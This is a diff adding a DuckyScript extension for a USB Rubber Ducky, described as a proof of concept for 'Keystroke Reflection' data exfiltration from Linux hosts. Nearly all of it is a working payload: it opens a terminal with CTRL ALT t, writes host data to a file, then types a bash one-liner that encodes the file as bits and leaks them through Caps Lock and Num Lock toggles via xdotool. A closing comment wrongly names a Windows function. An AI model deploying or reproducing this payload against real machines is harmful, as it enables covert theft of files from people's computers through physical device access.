@@ -1,0 +1,44 @@
+EXTENSION LINUX_HID_EXFIL
+    REM VERSION 1.0
+
+    REM REQUIRES EXFIL_AUTO_EOF_DETECT EXTENSION
+
+    REM Helpers for Linux Keystroke Reflection data exfiltration 
+    REM This payload is a proof of concept for USB HID only Data Exfiltration 
+
+    REM TARGET:
+    REM Linux Host that supports opening terminal via CTRL ALT t, and xdotool
+
+    REM USAGE:
+    REM Uncomment the function call below to run this extension inline 
+    REM or call RUN_LINUX_EXFIL() anywhere in your payload after the extension 
+
+    REM DEPLOYMENT:
+    REM Plug Ducky into host, wait for the LED to turn (and stay) solid Green.
+
+    REM CONFIGURATION:
+    REM File on host machine to exfil using Keystroke Reflection attack
+    DEFINE TARGET_FILE t.txt
+    DEFINE TERMINAL_OPEN_DELAY 500
+    DEFINE READY_TO_TYPE_DELAY 250
+    FUNCTION RUN_LINUX_EXFIL()
+        LED_OFF
+        DELAY READY_TO_TYPE_DELAY
+        CTRL ALT t
+        DELAY TERMINAL_OPEN_DELAY
+        SAVE_HOST_KEYBOARD_LOCK_STATE
+        $_EXFIL_MODE_ENABLED = TRUE
+        $_EXFIL_LEDS_ENABLED = TRUE
+        STRINGLN uname -a > TARGET_FILE
+        STRINGLN c="xdotool key --delay 4";o=" Caps_Lock";l=" Num_Lock";bs=$(xxd -b TARGET_FILE |cut -d " " -f2-7);for (( i=0;i<${#bs};i++ ));do b="${bs:$i:1}";if [[ "$b" == "0" ]];then c+=$o;fi;if [[ "$b" == "1" ]];then c+=$l;fi;done;eval "$c";exit
+        WAIT_FOR_EOF()
+        $_EXFIL_LEDS_ENABLED = FALSE
+        $_EXFIL_MODE_ENABLED = FALSE
+        RESTORE_HOST_KEYBOARD_LOCK_STATE
+    END_FUNCTION
+
+    REM Uncomment the function call below to run this extension inline (here) 
+    REM or call RUN_WINDOWS_EXFIL() anywhere in your payload after the extension 
+
+    REM RUN_LINUX_EXFIL()
+END_EXTENSION
